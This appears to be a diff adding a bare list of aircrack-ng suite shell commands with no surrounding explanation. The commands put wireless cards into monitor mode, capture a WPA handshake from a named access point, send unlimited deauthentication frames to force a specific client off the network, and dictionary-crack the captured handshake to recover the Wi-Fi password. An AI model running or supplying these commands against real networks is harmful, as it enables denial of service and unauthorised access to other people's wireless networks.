@@ -1,0 +1,27 @@
+
+
+sudo airmon-ng check kill
+
+sudo airmon-ng start wlan0
+sudo airmon-ng start wlan1
+
+sudo iwconfig
+
+
+sudo airodump-ng wlan0
+
+sudo iw dev wlan0 info
+sudo iw dev wlan0 set channel 3
+
+sudo airodump-ng --channel 3 --bssid  50:88:11:A1:8C:6D wlan0 --write handshake --output-format cap
+
+
+sudo aireplay-ng --deauth 0  -a 1C:5F:2B:E7:77:EA -c 40:E2:30:CC:1E:8D wlan1mon
+
+aircrack-ng handshake.cap -w passwords.txt
+
+sudo airmon-ng stop wlan0
+
+
+
+
